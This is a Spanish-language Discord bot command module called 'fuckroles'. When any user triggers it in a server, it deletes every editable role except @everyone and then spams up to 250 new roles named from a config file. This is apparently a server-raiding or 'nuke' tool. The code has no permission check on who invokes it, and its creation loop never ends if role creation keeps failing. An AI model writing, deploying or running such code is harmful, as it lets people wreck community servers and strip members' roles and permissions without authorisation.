const fs = require("fs");
const path = require("path");

module.exports = {
    name: "fuckroles",
    description: "Borra todos los roles y crea el máximo de roles con nombres sacados de config.json",
    run: async (message) => {
        if (!message.guild) return;

        const configPath = path.join(__dirname, "../config.json");
        if (!fs.existsSync(configPath)) {
            return message.reply("❌ No encontré el archivo config.json.");
        }

        const config = JSON.parse(fs.readFileSync(configPath, "utf8"));

        // 🔹 ahora sí: channelNames
        const channelNames = config.channelNames || [];
        if (channelNames.length === 0) {
            return message.reply("⚠️ No encontré nombres de canales en config.json.");
        }

        try {
            // 1. borrar roles existentes (excepto @everyone)
            for (const role of message.guild.roles.cache.values()) {
                if (role.editable && role.name !== "@everyone") {
                    try {
                        await role.delete("Eliminado por comando !roles");
                    } catch (err) {
                        console.error(`❌ No pude borrar el rol ${role.name}:`, err.message);
                    }
                }
            }

            // 2. crear roles hasta el máximo
            const MAX_ROLES = 250;
            let created = 0;

            while (created < MAX_ROLES) {
                for (const name of channelNames) {
                    if (created >= MAX_ROLES) break;

                    try {
                        await message.guild.roles.create({
                            name: name,
                            reason: "!roles creación masiva"
                        });
                        created++;
                    } catch (err) {
                        console.error(`❌ Error creando rol ${name}:`, err.message);
                    }
                }
            }

            await message.channel.send(`✅ Se crearon **${created}** roles usando los nombres de config.json.`);
        } catch (err) {
            console.error("❌ Error en !roles:", err);
            message.reply("❌ Hubo un error ejecutando el comando.");
        }
    }
};

